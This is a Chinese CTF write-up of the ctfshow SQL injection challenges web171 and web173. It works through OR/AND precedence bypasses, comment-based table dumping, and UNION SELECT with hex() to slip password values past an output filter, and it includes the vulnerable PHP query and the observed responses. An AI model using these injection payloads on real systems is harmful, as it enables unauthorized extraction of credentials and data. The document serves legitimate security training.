---
title: 题解-条件优先级与flag回显绕过
category: SQL注入/题解
tags: [ctfshow, web171, web173, or, and, 优先级, 注释, hex, 输出过滤]
order: 20
---

## 一句话概括

这两题各卡在一个限制上：web171 用 `username != 'flag'` 把目标行挡住了，靠 `OR` 的优先级旁路解决；web173 用 `/flag/i` 把回显挡住了，靠 `hex()` 编码解决。共同点是限制写在 SQL 里，就用 SQL 的等价写法绕过去。

## 被卡住的东西 → 绕过手法对照表

| 题目 | 限制 | 绕过手法 |
|---|---|---|
| web171 | `username !='flag' and id = '[输入]'` | `999' or id='26`，用 `OR` 让条件独立成立 |
| web171 | `limit 1` 只返回一行 | `26' or '1'='1'--+`，注释掉 `limit 1`，返回全部 |
| web173 | `!preg_match('/flag/i', json_encode($ret))` | `hex(password)`，输出里不出现 `flag` 字样 |

## 本题情景与解题手法：web171

### 题目形态

后端 SQL：

```php
// 拼接 sql 语句查找指定 ID 用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

页面直接回显用户名和密码。难点在于目标行的用户名就叫 `flag`，而 SQL 里明确写了 `username != 'flag'` 把它排除掉。

### 第一步：直接查目标 id 被过滤

假设 flag 用户是 `id=26`，直接查 `?id=26` 会被 `username !='flag'` 挡掉，页面没数据。

### 第二步：用 OR 旁路

```sql
999' or id='26
```

代入后：

```sql
select username,password from user
where username !='flag' and id = '999' or id='26' limit 1;
```

### 第三步：理解优先级

SQL 里 `AND` 的优先级高于 `OR`，所以上面等价于：

```sql
where (username !='flag' and id = '999') or id='26'
```

逐项看：

- 第一部分 `username !='flag' and id = '999'`：没有 id=999 的用户，结果为假；
- 第二部分 `id='26'`：存在，结果为真。

`假 OR 真 = 真`，于是 `id=26` 那行被返回，`username != 'flag'` 这个限制被完全绕过。

`limit 1` 保证只返回第一条匹配记录，也就是我们要的那一行。

### 第四步：为什么 `26' or '1'='1'--+` 能得到全表

```sql
select username,password from user where username !='flag' and id = '26' or '1'='1'--+' limit 1;
```

两个关键点：

1. 优先级：`(username !='flag' and id = '26') OR ('1'='1')`，`'1'='1'` 恒真，匹配表中所有行；
2. 注释符：`--+` 把后面的 `' limit 1` 整个注释掉了，`limit 1` 失效，所以返回的是全部数据，而不是一行。

### 注入手法一句话总结

条件被 `AND` 排除，就用 `OR` 让条件独立成立（靠 `AND > OR` 的优先级）；想拿全表，就用注释符干掉 `limit 1`。

### 结论延伸

`WHERE` 后面是一个条件句，只要它为真就能查到。`WHERE` 后面的表达式会逐行求值，结果为 TRUE 的行就被选中。`AND` 与 `OR` 的优先级和括号写法，决定了最终是哪几行满足条件。

## 本题情景与解题手法：web173

### 题目形态

同样的注入点，但页面在返回前加了一层检查：

```php
if (!preg_match('/flag/i', json_encode($ret))) {
    $ret['msg'] = '查询成功';
}
```

拆解：

1. `json_encode($ret)`：把要返回的数组转成 JSON 字符串；
2. `preg_match('/flag/i', ...)`：不区分大小写地找 `flag`（`Flag`、`FLAG` 都算）；
3. `!preg_match(...)`：只有回显里一个 `flag` 字样都没有，才提示"查询成功"。

### 第一步：定位被拦的原因

数据表 `ctfshow_user2` 里，目标行的 `username` 字段内容就是 `flag`。只要这一行原样显示出来，`json_encode($ret)` 里就含 `flag`，条件不成立，页面不给提示。

### 第二步：用 hex() 编码绕开字面匹配

```sql
-1' union select 1,2,hex(password) from ctfshow_user2 --+
```

回显是一串十六进制，页面里没有 `flag`，WAF 放行：

```text
70617373776F72644155544F
6E6F745F68657265
```

本地解码：

```text
70617373776F72644155544F  →  passwordAUTO
6E6F745F68657265          →  not_here
```

（`hex` 是十六进制编码，解码结果为上面的明文，这两段是对应的实测回显与还原结果。）

### 第三步：顺带确认库名

```sql
1' union select 1,2,database()--+
```

回显：

```text
ctfshow_web
```

### 第四步：其他 payload

```sql
1' union select 1,2,hex(password) where--+
-1' union select 1,2,hex(password) from ctfshow_user2--+
```

第一条是探索中试过的写法（`where` 后面没有条件），第二条是最终能跑通的完整形式：补上 `from 表名` 才能把列查出来。

### 注入手法一句话总结

回显被关键字黑名单卡住时，用 `hex()`（或 `to_base64()`）把结果编码再输出，页面匹配不到 `flag` 即可放行，本地解码还原。

## 注意事项

- `AND` 优先于 `OR`：不明确加括号时，SQL 按 `(A AND B) OR C` 解析。这是 web171 和 web181/web182 共同的立足点。
- `--+` 注释掉 `limit 1` 是能拿全表的关键：不注释时 `limit 1` 仍然生效，只会返回第一行。
- 判据要看页面文案：web173 只有在不含 `flag` 时才输出"查询成功"，这是确认编码是否生效的直接信号。
- `hex()` 编码是所有输出过滤题的通用解，与 `输出编码绕过` 里 web172 的 `to_base64()` 是同一思路的两种写法。
- 不要漏掉 `from`：`union select 列名` 必须跟 `from 表名`，否则列名无从解析。
